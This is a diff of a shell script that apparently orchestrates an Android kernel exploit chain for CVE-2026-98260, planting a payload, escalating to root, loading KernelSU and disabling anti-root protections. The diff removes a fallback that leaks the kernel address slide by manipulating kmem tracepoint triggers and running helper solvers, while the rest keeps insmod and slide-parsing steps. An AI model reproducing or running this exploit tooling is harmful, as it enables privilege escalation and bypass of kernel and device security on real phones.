@@ -2,7 +2,7 @@
 # PYB110 one-key flow, CVE-2026-98260 branch (t98260_plant + t98260_su).
 D=${PYB110_DIR:-/data/local/tmp/pyb110}
 cd "$D" || exit 1
-chmod 755 t98260_plant t98260_su prep_solve prep_patch forker ksu* ksud* 2>/dev/null
+chmod 755 t98260_plant t98260_su prep_patch ksu* ksud* 2>/dev/null
 
 MANAGER=${PYB110_MANAGER:-kernelsu}
 DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
@@ -205,19 +205,6 @@ fi
 if ! wait_kernelsu; then
   echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
   SLIDE=$(sed -n 's/.*SLIDE_DERIVED=0x\([0-9a-f]*\).*/0x\1/p' plant.log 2>/dev/null | tail -n 1)
-  if [ -z "$SLIDE" ]; then
-    echo "SLIDE_MISSING: fallback to take_slide+prep_solve"
-    R=/sys/kernel/tracing/events/kmem/rss_stat
-    echo 1 > "$R/enable" 2>/dev/null
-    printf 'disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-    printf 'disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-    printf 'disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-    sh take_slide.sh
-    ./prep_solve . syms.txt && SLIDE=$(cat slide.txt)
-    printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-    printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-    printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-  fi
   if [ -z "$SLIDE" ]; then
     echo "PATCH_FAIL: no slide"
     exit 14
